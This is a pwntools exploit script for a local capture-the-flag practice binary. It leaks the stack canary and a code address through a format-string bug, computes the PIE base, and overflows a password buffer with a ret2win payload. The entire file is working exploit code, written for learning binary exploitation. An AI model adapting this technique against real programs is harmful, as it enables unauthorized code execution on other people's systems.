from pwn import *

context.binary = elf = ELF("/home/kali/Desktop/offsec/prove/03_pie_canary_ret2win/chall")
libc = elf.libc 

#checksec: PIE, NX + CANARY, full RELRO

# find canary offset with gdb (check rax before stack_check_fail after sending cyclic)
# p/x $rax: 0x6161617461616173
# cyclic_find(0x6161617461616173) -> 72

# fs on print feedback -> leak canary
# bof on request access -> rop

canary_offset = 88
saved_rip_offset = canary_offset + 16

fs_canary_index = 29 #offset to read canary value in the stack
fs_elf_addr_index = 31 #and 37

#with gdb (same run) check what do these leak correspond to with info symbol 0x5608545c946e
offset_in_main = 103    #the leak at index 31 corresponds to the address of main+103

p = process(elf.path)

#step 1: leak the canary
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"report:\n", f"%{fs_canary_index}$lx")
leak = p.recvline().split(b"Report: ")[1].decode()
canary = int(leak, 16)
print(f"Found canary: {hex(canary)}")

#step 2: leak elf base 
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"report:\n", f"%{fs_elf_addr_index}$lx")
leak = p.recvline().split(b"Report: ")[1].decode()
main_leak = int(leak, 16)
print(f"Found main+103 leak: {hex(main_leak)}")

elf_base = main_leak - (elf.sym.main + 103)
elf.address = elf_base

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

win = elf.sym.win


payload = flat(
    b'A'*canary_offset,
    p64(canary),
    b'B'*8,
    p64(ret_gadget),
    p64(win)
)

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"password:\n", payload)
p.interactive()